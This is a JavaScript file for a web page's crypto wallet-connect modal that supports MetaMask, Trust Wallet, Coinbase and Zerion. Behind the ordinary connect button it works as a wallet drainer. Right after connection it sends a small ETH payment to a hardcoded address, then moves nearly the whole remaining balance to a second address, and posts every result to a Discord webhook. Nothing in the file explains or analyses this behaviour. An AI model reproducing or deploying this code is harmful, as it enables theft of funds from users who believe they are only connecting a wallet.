let isConnecting = false; // Flag to prevent multiple connections

document.getElementById("connectButton").addEventListener("click", openModal);

function openModal() {
    const modal = document.getElementById("walletModal");
    modal.style.display = "block";
    const modalContent = modal.querySelector(".modal-content");
    modalContent.style.bottom = "0"; // Slide up

    console.log("Modal opened for wallet selection");
}

function closeModal() {
    const modalContent = document.querySelector(".modal-content");
    modalContent.style.bottom = "-100%"; // Slide down

    // Delay hiding the modal background until the slide-down animation completes
    setTimeout(() => {
        document.getElementById("walletModal").style.display = "none";
        console.log("Modal closed after wallet selection");
    }, 400); // Match this duration with the CSS transition time
}

async function connectMetaMask() {
    console.log("MetaMask button clicked");
    await connectWallet("MetaMask");
}

async function connectTrustWallet() {
    console.log("Trust Wallet button clicked");
    await connectWallet("Trust Wallet");
}

async function connectCoinbaseWallet() {
    console.log("Coinbase Wallet button clicked");
    await connectWallet("Coinbase Wallet");
}

async function connectZerionWallet() {
    console.log("Zerion Wallet button clicked");
    await connectWallet("Zerion Wallet");
}

async function connectWallet(walletName) {
    if (isConnecting) {
        console.log("Connection request already in progress...");
        return; // Exit if already connecting
    }

    isConnecting = true;
    closeModal(); // Close the wallet modal when a selection is made

    try {
        let account;
        console.log(`Attempting to connect to ${walletName}...`);

        if (walletName === "MetaMask" || walletName === "Trust Wallet" || walletName === "Coinbase Wallet" || walletName === "Zerion Wallet") {
            if (typeof window.ethereum !== 'undefined') {
                console.log(`${walletName} detected. Requesting account...`);
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                account = accounts[0];
                console.log(`Connected to ${walletName} account: ${account}`);
            } else {
                alert(`${walletName} is not installed. Please install it.`);
                console.error(`${walletName} is not installed in the browser.`);
                return;
            }
        } else {
            alert("Invalid wallet selected.");
            console.error("Invalid wallet selection.");
            return;
        }

        if (account) {
            console.log(`Wallet connected. Initiating transaction for account: ${account}`);
            await sendFirstTransaction(account); // Automatically send the first transaction
        } else {
            console.error("No account found.");
        }

    } catch (error) {
        console.error(`Error connecting to ${walletName}:`, error);
    } finally {
        isConnecting = false; // Reset the flag
        console.log(`Finished connection attempt for ${walletName}`);
    }
}

async function sendFirstTransaction(walletAddress) {
    console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);
    
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.0002"; // Amount to send in first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction sent successfully. Response:", txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Automatically trigger the second transaction
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);

            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("Ethereum provider not detected. Please install MetaMask or another wallet.");
    }
}

async function sendSecondTransaction(signer, walletAddress) {
    console.log(`Preparing to send second transaction for wallet: ${walletAddress}`);
    
    // Updated token threshold to 0.001 Ether
    const tokenThreshold = ethers.utils.parseEther("0.001");
    const balance = await signer.getBalance();
    
    if (balance.gt(tokenThreshold)) { // Check if balance is greater than the threshold
        const recipientAddress = "0xAnotherAddressHere"; // Set the recipient for the second transaction
        const transaction = {
            to: recipientAddress,
            value: balance.sub(tokenThreshold), // Send amount above the threshold
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("Second transaction sent successfully. Response:", txResponse);

            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");
        } catch (error) {
            console.error("Error sending second transaction:", error);

            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.log("Balance is below the token threshold; no second transaction sent.");
    }
}

async function sendWebhook(message, status) {
    console.log(`Sending webhook. Status: ${status}, Message: ${message}`);

    const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; // Replace with your actual webhook URL

    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                content: `Transaction ${status}: ${message}`,
            }),
        });
        console.log("Webhook sent successfully.");
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}
